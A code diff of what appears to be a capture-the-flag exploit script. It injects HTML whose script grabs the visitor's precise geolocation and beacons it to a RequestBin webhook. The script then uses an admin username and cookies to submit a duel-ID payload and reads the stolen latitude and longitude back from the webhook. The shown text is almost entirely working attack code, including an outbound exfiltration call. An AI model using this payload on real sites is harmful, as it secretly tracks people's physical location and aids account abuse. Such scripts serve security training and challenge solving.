@@ -91,7 +91,7 @@ with RequestBinWebhook('enbit6i3l2ra4') as hook:
     src_html = """
     <body>
     <script>
-    navigator.geolocation.getCurrentPosition((d)=>navigator.sendBeacon('""" + hook.url + """', "latitude: " + d.coords.latitude.toString() + ",longitude: " + d.coords.longitude.toString()),(err)=>console.error(err), {'enableHighAccuracy':true});
+    navigator.geolocation.getCurrentPosition((d)=>navigator.sendBeacon('""" + hook.url + """', d.coords.latitude.toString() + "," + d.coords.longitude.toString()),(err)=>console.error(err), {'enableHighAccuracy':true});
     </script>
     </body>
     """
@@ -138,6 +138,7 @@ with RequestBinWebhook('enbit6i3l2ra4') as hook:
                         admin_event = [x for x in event[1] if x not in notifications][0]
                         break
     
+    print(admin_event)
     new_admin_username = admin_event.split(' ')[0]
     print("Got new admin username: ", new_admin_username)
 
@@ -146,6 +147,10 @@ with RequestBinWebhook('enbit6i3l2ra4') as hook:
         "duelID" : chalIdPayload
     }, cookies=cookies)
 
+    print(res.text)
+
     for req in hook.getRequestsSync():
-        print(req['body'])
-        break
+        latitude, longitude = req['body'].split(',')
+        
+
+print(latitude, longitude)
